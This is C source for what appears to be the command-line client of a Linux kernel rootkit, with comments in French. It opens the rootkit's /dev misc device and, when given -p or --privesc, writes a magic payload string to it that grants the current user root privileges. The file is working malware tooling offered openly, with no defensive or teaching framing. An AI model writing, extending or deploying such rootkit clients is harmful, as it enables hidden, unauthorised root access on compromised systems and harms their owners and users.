#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

#include "include/core.h"
#include "include/debug.h"
#include "include/config.h"


// voir comment intégrer la compilation de ce fichier dans le makefile

void display_help(char * filename);
int check_driver(char *driver);
int privesc(char *driver);
void show_info();

char *valid_args[] =
    {
        "-h", "--help", 
        "-p", "--privesc",
        "--info"
    };

void show_info(){

    printf("misc device name=%s \n", RK_DRIVER);
    printf("path=/dev/%s \n", RK_DRIVER);
    printf("privesc payload=\"%s\" \n", RK_PRIVESC);

}
void display_help(char * filename){

    printf("Usage: \n");
    printf("    %s <operation>\n", filename+2);
    printf("\n");
    printf("Operations: \n");
    printf("    -h --help       Display this menu\n");
    printf("    -p --privesc    Give root privileges to current user\n");
    printf("    --info          Display infos about the rootkit\n");

    exit(-1);
}

//tester
int check_driver(char *driver){

    int fd = open(driver, O_RDONLY);
    if (fd == -1)
    {
        CLIENT_DEBUG("Driver not found\n");
        return -1;
    } 
    CLIENT_DEBUG("Driver found\n");
    return 0;
}

// check_driver est éxécuté avant donc devrait pas y avoir de soucis
int privesc(char *driver){

    int ret;
    int fd = open(driver, O_WRONLY);
    const char * payload = RK_PRIVESC;

    ret = write(fd, payload, strlen(payload));

    if (ret == -1){
        CLIENT_DEBUG("Failed to write to device %s value : %s\n", driver, payload);
        return -1;
    } else{
        CLIENT_DEBUG("Wrote : '%s' for a length of %d bytes\n", payload, strlen(payload));
    }

    return 0;
}

int main(int argc, char *argv[]) {     

    if (argc < 2)
    {
        display_help(argv[0]);
    }

    char * driver = malloc(5+strlen(RK_DRIVER)+1); //len of /dev/ + len of RK_DRIVER + NULL byte
    strncpy(driver, "/dev/", strlen("/dev/")+1);
    strcat(driver, RK_DRIVER); // avec strcat("/dev/", RK_DRIVER) j'ai pas la bonne taille allouée 

    if (check_driver(driver) == -1)
    {
        CLIENT_DEBUG("Rootkit not loaded\n");
        exit(-1);
    }

    for (int i = 0; i < argc; i++) {

        CLIENT_DEBUG("Argument %d: %s\n", i, argv[i]);

        if ((strcmp(argv[i], "--privesc") == 0) || (strcmp(argv[i], "-p") == 0))
        {
            CLIENT_DEBUG("[+] Running the privesc\n");
            privesc(driver);
        }

        else if ((strcmp(argv[i], "--info") == 0) && (i == 1))
        {
            show_info();
            exit(-1);   
        }
        else if (i > 0)
        {
            printf("Unknown argument : %s\n", argv[i]);
            exit(-1);
        }
    }

    return 0;
}